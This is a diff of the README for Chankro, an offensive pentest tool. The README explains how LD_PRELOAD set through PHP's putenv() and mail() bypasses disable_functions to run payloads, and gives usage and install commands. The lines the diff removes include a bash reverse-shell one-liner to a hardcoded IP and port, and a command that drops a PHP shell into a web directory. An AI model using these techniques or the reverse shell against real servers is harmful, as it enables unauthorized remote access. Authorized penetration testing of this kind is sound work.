@@ -1,10 +1,34 @@
+# Chankro
+
+Your favourite tool to bypass __disable_functions__ and __open_basedir__ in your pentests. 
+
+## How it works
+
+PHP in Linux calls a binary (sendmail) when the mail() function is executed. If we have putenv() allowed, we can set the environment variable "LD_PRELOAD", so we can preload an arbitrary shared object. Our shared object will execute our custom payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example.
+
+## Example:
+
+The syntax is pretty straightforward:
+
 ```
-python chankro.py --arch 64 --input c.sh --output shell123.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db 
+$ python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
 ```
 
-# save to c.sh
+Note: path is the absolute path where our .so will be dropped.
+
+## Install
+
+### Git
 
 ```
-#!/bin/bash
-bash -i >& /dev/tcp/10.17.5.160/1122 0>&1
+$ git clone https://github.com/TarlogicSecurity/Chankro.git
+$ cd Chankro
+$ python2 chankro.py --help
+```
+
+### [BlackArch](https://blackarch.org/)
+
+```
+# pacman -S chankro
+$ chankro --help
 ```
